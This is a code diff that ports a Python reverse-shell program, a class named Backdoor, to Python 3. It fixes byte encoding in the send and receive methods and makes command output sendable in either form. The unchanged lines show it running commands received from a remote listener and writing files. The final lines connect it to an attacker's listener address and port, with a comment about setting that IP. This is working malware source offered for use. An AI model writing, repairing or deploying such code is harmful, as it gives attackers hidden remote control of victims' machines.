@@ -21,13 +21,13 @@ class Backdoor:
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024).decode()
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -66,10 +66,12 @@ class Backdoor:
                 command_result = self.write_file(received_command[1], received_command[2])
             else:
                 command_result = self.execute_system_command(received_command)
+            try:
+                self.reliable_send(command_result.decode())
+            except AttributeError:
+                self.reliable_send(command_result)
 
-            self.reliable_send(command_result)
 
-
-# Replace ip and port of your choice
+# Replace ip with ip of the listener machine and port of your choice
 my_backdoor = Backdoor("192.168.1.24", 4444)
 my_backdoor.run()
